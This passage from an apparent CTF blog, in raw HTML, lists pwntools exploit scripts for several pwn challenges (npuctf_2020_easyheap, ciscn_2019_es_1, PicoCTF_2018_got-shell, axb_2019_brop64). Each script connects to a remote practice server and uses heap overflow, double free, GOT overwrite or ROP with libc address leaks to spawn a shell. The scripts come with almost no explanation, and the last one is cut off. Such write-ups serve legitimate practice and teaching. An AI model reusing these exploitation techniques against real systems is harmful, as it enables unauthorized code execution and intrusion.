npuctf_2020_easyheap_solve</h1><h3 id="exp-84"><a href="#exp-84" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25288</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;npuctf_2020_easyheap&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; : &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&quot;: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">heaparr = <span class="number">0x00000000006020A0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;e&#x27;</span>*<span class="number">0x18</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> +p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x38</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">atoi_addr = l64()</span><br><span class="line">lg(<span class="string">&#x27;atoi_addr&#x27;</span>, atoi_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>, atoi_addr)</span><br><span class="line">libcbase = atoi_addr - libc.dump(<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcbase = atoi_addr - libc.sym[&#x27;atoi&#x27;]</span></span><br><span class="line"><span class="comment"># system = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libcbase + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-85-ciscn-2019-es-1-solve"><a href="#NO-85-ciscn-2019-es-1-solve" class="headerlink" title="NO.85 ciscn_2019_es_1_solve"></a>NO.85 ciscn_2019_es_1_solve</h1><h3 id="exp-85"><a href="#exp-85" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_es_1&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27994</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_es_1&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, name, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;name\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sa(<span class="string">&#x27;:\n&#x27;</span>, name)</span><br><span class="line">sa(<span class="string">&#x27;:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># free(1)</span></span><br><span class="line"><span class="comment"># free(0)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">__malloc_hook = l64() - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,__malloc_hook)</span><br><span class="line">libcbase = __malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = libcbase + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcbase = __malloc_hook - libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="comment"># system = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># free_hook = libcbase + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;__malloc_hook&#x27;</span>, __malloc_hook)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;free_hook&#x27;</span>, free_hook)</span><br><span class="line"><span class="comment"># add(0x20,p64(elf.got[&#x27;puts&#x27;]),&#x27;bbbbb&#x27;)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x60</span>, p64(free_hook), <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(system), <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-86-PicoCTF-2018-got-shell-solve"><a href="#NO-86-PicoCTF-2018-got-shell-solve" class="headerlink" title="NO.86 PicoCTF_2018_got-shell_solve"></a>NO.86 PicoCTF_2018_got-shell_solve</h1><h3 id="exp-86"><a href="#exp-86" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_got-shell&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29908</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;PicoCTF_2018_got-shell&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = <span class="built_in">hex</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])[<span class="number">2</span>:]</span><br><span class="line">win  = <span class="string">&#x27;804854B&#x27;</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;?\n&#x27;</span>, puts_got)</span><br><span class="line">sla(<span class="string">&#x27;\n&#x27;</span>, win)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-87-axb-2019-brop64-solve"><a href="#NO-87-axb-2019-brop64-solve" class="headerlink" title="NO.87 axb_2019_brop64_solve"></a>NO.87 axb_2019_brop64_solve</h1><h3 id="exp-87"><a href="#exp-87" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./axb_2019_brop64&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28674</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;axb_2019_brop64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400963</span></span><br><span class="line">main = <span class="number">0x00000000004007D6</span></span><br><span class="line">ret = <span class="number">0x0000000000400629</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;If there is a chance,I won&#x27;t make any mistake!\n&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>+<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27;*(0xd0+8)</span></span><br><span class="line">payload += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line">puts_addr = l64()</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcbase = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># system = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libcbase + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;if there is a chance,I won&#x27;t make any mistake!\n&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>+<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(ret)*<span class="number">0</span> + p64(pop_rdi) + p64(binsh) + p64(system) <span class="comment">#+ p64(main)</span></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb,attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-88-mrctf2020-easy-equation-solve"><a href="#NO-88-mrctf2020-easy-equation-solve" class="headerlink" title="NO.88 mrctf2020_easy_equation_solve"></a>NO.88 mrctf2020_easy_equation_solve</h1><h3 id="exp-88"><a href="#exp-88" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span 